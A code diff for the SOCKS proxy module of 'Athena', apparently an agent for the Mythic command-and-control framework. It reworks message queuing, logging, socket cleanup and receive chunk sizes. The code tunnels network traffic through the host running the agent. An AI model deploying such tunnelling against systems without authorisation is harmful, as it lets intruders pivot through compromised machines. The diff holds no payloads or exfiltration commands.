@@ -27,6 +27,7 @@ namespace Athena.Commands.Model
 
         public bool Start()
         {
+            this.ct = new CancellationTokenSource();
             try
             {
                 //Read
@@ -58,6 +59,7 @@ namespace Athena.Commands.Model
         public List<SocksMessage> getMessages()
         {
             List<SocksMessage> messages = this.messagesOut.ToList();
+            //Misc.WriteDebug("Messages Out Queue: " + messagesOut.Count);
             this.messagesOut.Clear();
             messages.Reverse();
             return messages;
@@ -65,6 +67,7 @@ namespace Athena.Commands.Model
 
         public void AddToQueue(SocksMessage message)
         {
+            //Misc.WriteDebug("Message In Queue: " + messagesIn.Count);
             this.messagesIn.Enqueue(message);
         }
 
@@ -74,14 +77,17 @@ namespace Athena.Commands.Model
         {
             while (!this.ct.IsCancellationRequested)
             {
-                //Get our current list
-                Parallel.ForEach(messagesIn, message =>
-                {
-                    HandleMessage(message);
-                });
+                SocksMessage sm;
+                while (!messagesIn.TryDequeue(out sm)) { }
+                //Misc.WriteDebug(messagesIn.Count().ToString());
+                Task.Run(() => { HandleMessage(sm); });
             }
         }
 
+        public int Count()
+        {
+            return this.messagesOut.Count();
+        }
         //This function will send messages from the Server TO mythic.
         //Server -> Athena -> Mythic -> Client
         private void ReadServerMessages()
@@ -90,9 +96,32 @@ namespace Athena.Commands.Model
             {
                 Parallel.ForEach(this.connections, connection =>
                 {
-                    if (connection.Value.socket.Available > 0)
+                    try
                     {
-                        ReceiveChunk(connection.Value);
+                        if (connection.Value.socket.Available > 0)
+                        {
+                            ReceiveChunk(connection.Value);
+                        }
+
+                        if (!connection.Value.socket.Connected)
+                        {
+                            //Misc.WriteDebug($"{connection.Key} closed socket.");
+                            SocksMessage smOut = new SocksMessage()
+                            {
+                                server_id = connection.Key,
+                                data = "",
+                                exit = true
+                            };
+
+                            //Add to our messages queue.
+                            this.messagesOut.Add(smOut);
+                        }
+                    }
+                    catch (ObjectDisposedException)
+                    {
+                        //ConnectionOptions cn;
+                        //while (!this.connections.TryRemove(connection.Key, out cn)) { }
+                        //Misc.WriteDebug("Removed Connection.");
                     }
                 });
             }
@@ -126,7 +155,7 @@ namespace Athena.Commands.Model
                         //We get an empty datagram for a connection we're currently following.
                         if (sm.exit)
                         {
-                            Console.WriteLine("[ServerID] " + sm.server_id + " exit.");
+                            //Misc.WriteDebug("[ServerID] " + sm.server_id + " exit.");
                             //Datagram is an exit packet from Mythic, let's close the connection, dispose of the socket, and remove it from our tracker.
                             //if (this.connections.ContainsKey(sm.server_id))
                             //{
@@ -137,13 +166,15 @@ namespace Athena.Commands.Model
 
                             //Remove from our tracker
                             //while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
-                            //Console.WriteLine("Removed Connection.");
+                            //ConnectionOptions cn;
+                            //while (!this.connections.TryRemove(sm.server_id, out cn)) { }
+                            //Misc.WriteDebug("Removed Connection.");
 
                             //No reason really to send a response to Mythic
                         }
                         else
                         {
-                            Console.WriteLine("[EmptyNonExitPacket] Sent by ID: " + sm.server_id);
+                            Misc.WriteDebug("[EmptyNonExitPacket] Sent by ID: " + sm.server_id);
                         }
                         //Do I need an else for this? What do we do with empty data packets?
                     }
@@ -151,7 +182,7 @@ namespace Athena.Commands.Model
                 catch (SocketException e)
                 {
                     //We hit an error, let's figure out what it is.
-                    Console.WriteLine(e.Message + $"({e.ErrorCode})");
+                    Misc.WriteDebug(e.Message + $"({e.ErrorCode})");
                     //Tell mythic that we've closed the connection and that it's time to close it on the client end.
                     SocksMessage smOut = new SocksMessage()
                     {
@@ -161,11 +192,10 @@ namespace Athena.Commands.Model
                     };
 
                     //Add to our messages queue.
-                    //Globals.bagOut[sm.server_id] = smOut;
                     this.messagesOut.Add(smOut);
 
                     //Remove connection from our tracker.
-                    while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
+                    //while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
                 }
 
             }
@@ -213,18 +243,21 @@ namespace Athena.Commands.Model
 
 
                         //TODO SUPPORT FOR BINDING AND UDP STREAMS
-                        switch (datagram[1])
-                        {
-                            case (byte)0x01: //TCP/IP Stream
-                                             //Console.WriteLine("TCP/IP Stream");
-                                break;
-                            case (byte)0x02: //TCP/IP Port Bind
-                                             //Console.WriteLine("TCP/IP Bind");
-                                break;
-                            case (byte)0x03: //associate UDP Port
-                                             //Console.WriteLine("UDP Port");
-                                break;
-                        }
+                        //switch (datagram[1])
+                        //{
+                        //    case (byte)0x01: //tcp/ip stream
+                        //        Misc.WriteDebug("tcp/ip stream");
+                        //        break;
+                        //    case (byte)0x02: //tcp/ip port bind
+                        //        Misc.WriteDebug("tcp/ip bind");
+                        //        break;
+                        //    case (byte)0x03: //associate udp port
+                        //        Misc.WriteDebug("udp port");
+                        //        break;
+                        //    default:
+                        //        Misc.WriteDebug("Unknown");
+                        //        break;
+                        //}
 
                         //Did our ConnectionOptions object create properly?
                         if (cn.socket != null && cn.endpoint != null)
@@ -250,18 +283,17 @@ namespace Athena.Commands.Model
                                     data = Misc.Base64Encode(cr.ToByte()),
                                     exit = false
                                 };
-
                                 //Add to our message queue
-                                //Globals.bagOut[sm.server_id] = smOut;
                                 this.messagesOut.Add(smOut);
 
                                 //Add the ConnectionsOptions object to our tracker.
                                 //Mostly only down here to prevent us from having to worry about removing it if something happened with adding it to the MythicOut queue
-                                while (!this.connections.TryAdd(sm.server_id, cn)) ;
+                                //while (!this.connections.TryAdd(sm.server_id, cn)) ;
+                                this.connections.AddOrUpdate(sm.server_id, cn, (key, oldValue) => cn);
                             }
                             catch (SocketException e)
                             {
-                                Console.WriteLine(e.Message + $"({e.ErrorCode})");
+                                Misc.WriteDebug(e.Message + $"({e.ErrorCode})");
                                 //We failed to connect likely. Why though?
                                 ConnectResponse cr = new ConnectResponse()
                                 {
@@ -314,9 +346,7 @@ namespace Athena.Commands.Model
                                     data = Misc.Base64Encode(cr.ToByte()),
                                     exit = true
                                 };
-
                                 //Put in out queue
-                                //Globals.bagOut[sm.server_id] = smOut;
                                 this.messagesOut.Add(smOut);
                             }
                         }
@@ -336,16 +366,19 @@ namespace Athena.Commands.Model
                             //Couldn't figure out the address family for the request.
                             if (cn.addressFamily == AddressFamily.Unknown)
                             {
+                                Misc.WriteDebug("Address Family not supported.");
                                 cr.status = ConnectResponseStatus.AddressTypeNotSupported;
                             }
                             //Endpoint could not be resolved.
                             else if (cn.endpoint is null)
                             {
+                                Misc.WriteDebug("Host Unreachable.");
                                 cr.status = ConnectResponseStatus.HostUnreachable;
                             }
                             //Something else.
                             else
                             {
+                                Misc.WriteDebug("Random Failure.");
                                 cr.status = ConnectResponseStatus.GeneralFailure;
                             }
 
@@ -358,17 +391,17 @@ namespace Athena.Commands.Model
                             };
 
                             //Add it to queue, and we're outta here!
-                            //Globals.bagOut[sm.server_id] = smOut;
                             this.messagesOut.Add(smOut);
                         }
                     }
                 }
                 else
                 {
+                    Misc.WriteDebug(sm.data);
                     //If we get here, it's both an empty datagram and for a connection we're not currently following.
                 }
             }
-            }
+        }
 
         private void ReceiveChunk(ConnectionOptions conn)
         {
@@ -382,18 +415,16 @@ namespace Athena.Commands.Model
             while (conn.socket.Available != 0)
             {
                 //Let's allocate our bytes, either in 512k chunks or less.
-                if (conn.socket.Available < 512000)
+                if (conn.socket.Available < 1024000)
                 {
                     bytes = new byte[conn.socket.Available];
                 }
                 else
                 {
-                    bytes = new byte[512000];
+                    bytes = new byte[1024000];
                 }
-
                 //Receive our allocation.
                 bytesRec = conn.socket.Receive(bytes);
-
 
                 smOut = new SocksMessage()
                 {
